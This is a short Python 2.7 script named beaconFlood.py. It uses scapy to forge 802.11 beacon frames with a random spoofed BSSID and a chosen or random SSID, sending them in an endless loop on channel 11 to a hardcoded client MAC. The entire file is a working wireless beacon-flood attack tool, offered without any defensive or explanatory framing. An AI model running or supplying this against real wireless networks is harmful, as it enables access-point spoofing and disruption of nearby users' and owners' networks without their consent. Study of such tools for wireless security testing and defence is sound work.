#!/usr/bin/python2.7

import sys
from scapy.all import *
from channelHopper import changeChannel

conf.verb=0
brdcstMAC="ff:ff:ff:ff:ff:ff"

def sendBeaconPkts(iface, ssid, client=brdcstMAC):

	bssid=str(RandMAC())
	client="D8:3C:69:F2:F2:29"
	while True:
		essid=str(ssid)
		# bssid=str(RandMAC())
		# channel=changeChannel(iface, RandSingNum(1, 14))
		channel=changeChannel(iface, RandSingNum(11, 11))
		print "Current MAC:", bssid, "on Channel", channel, "with SSID:", essid
		beaconPkt=RadioTap() / Dot11(type=0, subtype=8, addr1=client, addr2=bssid, addr3=bssid) / Dot11Beacon() / Dot11Elt(ID=0, info=essid) / Dot11Elt(ID=1, info="\x02\x04\x0b\x16\x0c") / Dot11Elt(ID=3, info=chr(channel))
		sendp(beaconPkt, iface=iface, count=100)


if __name__=="__main__":
	print "USAGE: ./beaconFlood.py <iface> [<ssid>] ...\n[] ---> OPTIONAL!\n"

	ssid=RandString(RandEnum(1, 14))
	if len(sys.argv)==3:
		ssid=sys.argv[2]

	sendBeaconPkts(sys.argv[1], ssid)